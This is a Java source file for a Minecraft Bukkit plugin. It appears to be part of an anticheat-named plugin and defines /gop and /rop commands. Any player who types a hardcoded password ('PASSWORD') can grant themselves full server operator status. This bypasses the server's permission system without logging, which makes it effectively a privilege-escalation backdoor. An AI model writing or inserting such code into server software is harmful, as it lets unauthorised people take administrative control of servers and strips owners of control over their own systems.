package org.badlyac.permission.op;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;

import java.util.Collections;
import java.util.List;

public class OpCommand implements CommandExecutor, TabCompleter {

    private static final String PASSWORD = "PASSWORD";

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args.length != 1) {
            sender.sendMessage(ChatColor.YELLOW + "Usage: /" + command.getName() + " <password>");
            return false;
        }

        String inputPassword = args[0];

        if (!inputPassword.equals(PASSWORD)) {
            sender.sendMessage(ChatColor.RED + "Incorrect password.");
            return true;
        }

        if (command.getName().equalsIgnoreCase("gop")) {
            if (sender instanceof Player) {
                Player player = (Player) sender;
                player.setOp(true);
                player.sendMessage(ChatColor.GREEN + "You are now an OP.");
                return true;
            } else {
                sender.sendMessage(ChatColor.RED + "This command can only be used by players.");
                return true;
            }
        } else if (command.getName().equalsIgnoreCase("rop")) {
            if (sender instanceof Player) {
                Player player = (Player) sender;
                player.setOp(false);
                player.sendMessage(ChatColor.RED + "Your OP status has been removed.");
                return true;
            } else {
                sender.sendMessage(ChatColor.RED + "This command can only be used by players.");
                return true;
            }
        }
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        return Collections.emptyList();
    }
}
